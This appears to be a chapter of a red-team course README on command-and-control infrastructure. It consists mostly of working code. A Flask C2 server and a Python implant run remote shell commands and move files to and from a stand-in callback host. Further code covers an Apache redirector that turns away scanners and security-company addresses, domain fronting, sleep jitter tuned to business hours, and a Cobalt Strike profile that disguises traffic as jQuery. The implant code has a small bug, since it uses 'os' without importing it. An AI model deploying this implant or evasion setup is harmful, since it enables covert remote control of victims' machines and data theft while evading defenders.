# Phase 9: Command & Control (C2) Infrastructure

## 🎯 Overview

Command and Control infrastructure is the **nervous system** of APT operations. A robust C2 ensures resilient communication, operational flexibility, and long-term access to compromised environments.

---

## 🏗️ C2 Architecture Layers

### Tier 1: Operator Console
- **Purpose**: Red team operator interface
- **Components**: C2 management dashboard, task assignment, data visualization
- **Security**: Multi-factor authentication, audit logging, encrypted comms

### Tier 2: Team Servers
- **Purpose**: Primary C2 backend processing
- **Components**: Task queuing, payload generation, data aggregation
- **Technologies**: Cobalt Strike, Covenant, Mythic, Sliver, Custom frameworks

### Tier 3: Redirectors
- **Purpose**: Traffic obfuscation and operator protection
- **Components**: Apache mod_rewrite, Nginx reverse proxy, HAProxy, Traefik
- **Function**: Hide team server IPs, filter traffic, block blue team IPs

### Tier 4: Obfuscation Layer
- **Purpose**: Blend with legitimate traffic
- **Components**: CDN (Cloudflare), Domain fronting, Cloud services
- **Techniques**: HTTPS masquerading, DNS tunneling, protocol mimicry

### Tier 5: Target Environment
- **Purpose**: Execute tasks on compromised systems
- **Components**: Beacons/implants, payloads, post-exploitation modules
- **Communication**: Check-in/callback mechanisms, encrypted channels

---

## 🛠️ Custom C2 Framework Development

### Minimal C2 Server (Python)

```python
#!/usr/bin/env python3
"""
Minimal C2 Server - Educational Implementation
Author: Wan Mohamad Hanis
"""

from flask import Flask, request, jsonify
from cryptography.fernet import Fernet
import sqlite3
import json
from datetime import datetime
import secrets

app = Flask(__name__)

# Generate encryption key (store securely in production)
ENCRYPTION_KEY = Fernet.generate_key()
cipher = Fernet(ENCRYPTION_KEY)

# Database setup
def init_db():
    conn = sqlite3.connect('c2_database.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS beacons
                 (beacon_id TEXT PRIMARY KEY,
                  hostname TEXT,
                  username TEXT,
                  ip_address TEXT,
                  os_info TEXT,
                  first_seen TEXT,
                  last_seen TEXT,
                  status TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS tasks
                 (task_id TEXT PRIMARY KEY,
                  beacon_id TEXT,
                  command TEXT,
                  arguments TEXT,
                  created_at TEXT,
                  status TEXT,
                  result TEXT)''')
    conn.commit()
    conn.close()

init_db()

@app.route('/api/register', methods=['POST'])
def register_beacon():
    """Register new beacon"""
    try:
        # Decrypt beacon data
        encrypted_data = request.data
        decrypted_data = cipher.decrypt(encrypted_data)
        beacon_info = json.loads(decrypted_data)
        
        beacon_id = secrets.token_hex(16)
        timestamp = datetime.now().isoformat()
        
        conn = sqlite3.connect('c2_database.db')
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO beacons VALUES (?,?,?,?,?,?,?,?)''',
                  (beacon_id, 
                   beacon_info.get('hostname'),
                   beacon_info.get('username'),
                   beacon_info.get('ip'),
                   beacon_info.get('os'),
                   timestamp,
                   timestamp,
                   'active'))
        conn.commit()
        conn.close()
        
        # Return encrypted beacon ID
        response = cipher.encrypt(beacon_id.encode())
        return response
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/checkin/<beacon_id>', methods=['GET'])
def checkin(beacon_id):
    """Beacon check-in and task retrieval"""
    try:
        # Update last seen
        conn = sqlite3.connect('c2_database.db')
        c = conn.cursor()
        c.execute('''UPDATE beacons SET last_seen=? WHERE beacon_id=?''',
                  (datetime.now().isoformat(), beacon_id))
        
        # Get pending tasks
        c.execute('''SELECT task_id, command, arguments FROM tasks 
                     WHERE beacon_id=? AND status='pending' ''', (beacon_id,))
        tasks = c.fetchall()
        conn.commit()
        conn.close()
        
        task_list = [{'task_id': t[0], 'command': t[1], 'args': t[2]} for t in tasks]
        
        # Encrypt and return
        response = cipher.encrypt(json.dumps(task_list).encode())
        return response
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/result/<beacon_id>', methods=['POST'])
def submit_result(beacon_id):
    """Receive task execution results"""
    try:
        encrypted_data = request.data
        decrypted_data = cipher.decrypt(encrypted_data)
        result_data = json.loads(decrypted_data)
        
        conn = sqlite3.connect('c2_database.db')
        c = conn.cursor()
        c.execute('''UPDATE tasks SET status='completed', result=? 
                     WHERE task_id=?''',
                  (result_data.get('output'), result_data.get('task_id')))
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    # In production: use proper WSGI server (Gunicorn, uWSGI)
    # Enable SSL/TLS with valid certificates
    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')
```

### Beacon/Implant (Python)

```python
#!/usr/bin/env python3
"""
C2 Beacon Client - Educational Implementation
"""

import requests
import json
import time
import random
import socket
import platform
import subprocess
from cryptography.fernet import Fernet
import base64

class C2Beacon:
    def __init__(self, c2_url: str, encryption_key: bytes, sleep: int = 60, jitter: float = 0.3):
        self.c2_url = c2_url
        self.cipher = Fernet(encryption_key)
        self.beacon_id = None
        self.sleep_time = sleep
        self.jitter = jitter
        
    def register(self):
        """Register with C2 server"""
        system_info = {
            'hostname': socket.gethostname(),
            'username': os.getlogin(),
            'ip': self.get_local_ip(),
            'os': platform.platform()
        }
        
        encrypted_data = self.cipher.encrypt(json.dumps(system_info).encode())
        
        try:
            response = requests.post(
                f"{self.c2_url}/api/register",
                data=encrypted_data,
                verify=False,  # In production: use proper cert validation
                timeout=30
            )
            
            self.beacon_id = self.cipher.decrypt(response.content).decode()
            print(f"[+] Registered with C2: {self.beacon_id}")
        except Exception as e:
            print(f"[!] Registration failed: {e}")
    
    def checkin(self):
        """Check in with C2 and retrieve tasks"""
        try:
            response = requests.get(
                f"{self.c2_url}/api/checkin/{self.beacon_id}",
                verify=False,
                timeout=30
            )
            
            decrypted = self.cipher.decrypt(response.content)
            tasks = json.loads(decrypted)
            
            return tasks
        except Exception as e:
            print(f"[!] Check-in failed: {e}")
            return []
    
    def execute_task(self, task: dict) -> str:
        """Execute task and return output"""
        command = task.get('command')
        args = task.get('args', '')
        
        try:
            if command == 'shell':
                result = subprocess.run(
                    args,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=60
                )
                return result.stdout + result.stderr
            
            elif command == 'download':
                with open(args, 'rb') as f:
                    return base64.b64encode(f.read()).decode()
            
            elif command == 'upload':
                # Parse filename and data
                filename, data = args.split('|', 1)
                with open(filename, 'wb') as f:
                    f.write(base64.b64decode(data))
                return f"[+] Uploaded: {filename}"
            
            elif command == 'sleep':
                self.sleep_time = int(args)
                return f"[+] Sleep interval updated: {args}s"
            
            else:
                return f"[!] Unknown command: {command}"
        
        except Exception as e:
            return f"[!] Execution error: {str(e)}"
    
    def submit_result(self, task_id: str, output: str):
        """Submit task results to C2"""
        result_data = {
            'task_id': task_id,
            'output': output
        }
        
        encrypted = self.cipher.encrypt(json.dumps(result_data).encode())
        
        try:
            requests.post(
                f"{self.c2_url}/api/result/{self.beacon_id}",
                data=encrypted,
                verify=False,
                timeout=30
            )
        except Exception as e:
            print(f"[!] Result submission failed: {e}")
    
    def calculate_sleep(self) -> int:
        """Calculate sleep time with jitter"""
        jitter_value = random.uniform(-self.jitter, self.jitter)
        actual_sleep = int(self.sleep_time * (1 + jitter_value))
        return max(actual_sleep, 1)
    
    def get_local_ip(self) -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "unknown"
    
    def run(self):
        """Main beacon loop"""
        self.register()
        
        while True:
            # Check in and get tasks
            tasks = self.checkin()
            
            # Execute tasks
            for task in tasks:
                output = self.execute_task(task)
                self.submit_result(task['task_id'], output)
            
            # Sleep with jitter
            sleep_time = self.calculate_sleep()
            time.sleep(sleep_time)

# Usage
if __name__ == "__main__":
    # In production: embed key securely, use proper key exchange
    KEY = b'your-encryption-key-here'
    
    beacon = C2Beacon(
        c2_url="https://your-c2-server.com",
        encryption_key=KEY,
        sleep=60,
        jitter=0.3
    )
    
    beacon.run()
```

---

## 🔐 Redirector Configuration

### Apache mod_rewrite Redirector

```apache
# /etc/apache2/sites-available/c2-redirector.conf

<VirtualHost *:443>
    ServerName legitimate-looking-domain.com
    
    SSLEngine On
    SSLCertificateFile /etc/letsencrypt/live/domain/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/domain/privkey.pem
    
    # Enable rewrite engine
    RewriteEngine On
    
    # Block known security scanners
    RewriteCond %{HTTP_USER_AGENT} "nmap|nikto|sqlmap|burp" [NC]
    RewriteRule ^.*$ https://www.google.com [L,R=302]
    
    # Block security companies (update regularly)
    RewriteCond %{REMOTE_ADDR} ^52\.12\.0\.0$ [OR]
    RewriteCond %{REMOTE_ADDR} ^104\.131\.0\.0$
    RewriteRule ^.*$ https://www.google.com [L,R=302]
    
    # Only allow specific User-Agent (beacon fingerprint)
    RewriteCond %{HTTP_USER_AGENT} !^Mozilla/5\.0.*Windows.*Chrome/1[0-9]{2}
    RewriteRule ^.*$ https://www.google.com [L,R=302]
    
    # Require specific URI path
    RewriteCond %{REQUEST_URI} !^/api/
    RewriteRule ^.*$ - [F]
    
    # Forward legitimate traffic to team server
    RewriteCond %{REQUEST_URI} ^/api/
    RewriteRule ^/(.*)$ https://team-server-ip:443/$1 [P,L]
    
    # Logging
    ErrorLog ${APACHE_LOG_DIR}/c2_error.log
    CustomLog ${APACHE_LOG_DIR}/c2_access.log combined
</VirtualHost>
```

---

## 🌐 Domain Fronting

### CloudFront Domain Fronting (Legacy)

```python
"""
Domain Fronting via CloudFront
Note: This technique has been largely mitigated by cloud providers
"""

import requests

def fronted_request(actual_target, front_domain):
    """
    Use CloudFront domain fronting to hide real C2 domain
    """
    headers = {
        'Host': actual_target,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'
    }
    
    # Request goes to front_domain but Host header contains real target
    response = requests.get(
        f"https://{front_domain}/api/checkin",
        headers=headers,
        verify=True
    )
    
    return response.content

# Usage
fronted_request("c2-server.com", "cloudfront.net")
```

---

## 📊 C2 Traffic Analysis Evasion

### Sleep Obfuscation

```go
// Beacon sleep with advanced obfuscation (Golang)
package main

import (
    "math/rand"
    "time"
)

type Beacon struct {
    SleepMin    int
    SleepMax    int
    Jitter      float64
    ActiveHours []int  // Only beacon during business hours
}

func (b *Beacon) CalculateSleep() time.Duration {
    // Random sleep within range
    sleepTime := rand.Intn(b.SleepMax-b.SleepMin) + b.SleepMin
    
    // Apply jitter
    jitter := float64(sleepTime) * b.Jitter * (rand.Float64()*2 - 1)
    actualSleep := sleepTime + int(jitter)
    
    // Check if in active hours
    currentHour := time.Now().Hour()
    inActiveHours := false
    for _, hour := range b.ActiveHours {
        if currentHour == hour {
            inActiveHours = true
            break
        }
    }
    
    // Sleep longer outside business hours
    if !inActiveHours {
        actualSleep *= 4
    }
    
    return time.Duration(actualSleep) * time.Second
}

func main() {
    beacon := Beacon{
        SleepMin:    30,
        SleepMax:    300,
        Jitter:      0.3,
        ActiveHours: []int{9, 10, 11, 12, 13, 14, 15, 16, 17},  // 9AM-5PM
    }
    
    for {
        // Perform beacon activities
        checkin()
        
        // Sleep with obfuscation
        sleepDuration := beacon.CalculateSleep()
        time.Sleep(sleepDuration)
    }
}
```

---

## 🛡️ Detection Evasion

### C2 Profile Customization (Malleable C2)

```
# Cobalt Strike Malleable C2 Profile - jQuery themed

set sleeptime "30000";  # 30 seconds
set jitter "20";         # 20% jitter
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

http-get {
    set uri "/jquery-3.6.0.min.js";
    
    client {
        header "Accept" "application/javascript, */*";
        header "Accept-Language" "en-US,en;q=0.9";
        header "Accept-Encoding" "gzip, deflate";
        header "Referer" "https://www.google.com/";
        
        metadata {
            base64url;
            prepend "/*! jQuery v3.6.0";
            append "*/";
            header "Cookie";
        }
    }
    
    server {
        header "Content-Type" "application/javascript; charset=utf-8";
        header "Cache-Control" "max-age=31536000";
        header "X-Content-Type-Options" "nosniff";
        
        output {
            base64url;
            prepend "/*! jQuery v3.6.0 | (c) JS Foundation */
";
            append "
/* End of jQuery */";
            print;
        }
    }
}

http-post {
    set uri "/api/track";
    
    client {
        header "Content-Type" "application/x-www-form-urlencoded";
        
        id {
            base64url;
            parameter "sid";
        }
        
        output {
            base64url;
            parameter "data";
        }
    }
    
    server {
        header "Content-Type" "application/json";
        output {
            base64url;
            prepend "{\"status\":\"ok\",\"data\":\"";
            append "\"}";
            print;
        }
    }
}
```

---

**Next Phase**: [Impact & Cleanup →](../10-impact-cleanup/README.md)

**Previous Phase**: [← Collection & Exfiltration](../08-collection-exfiltration/README.md)
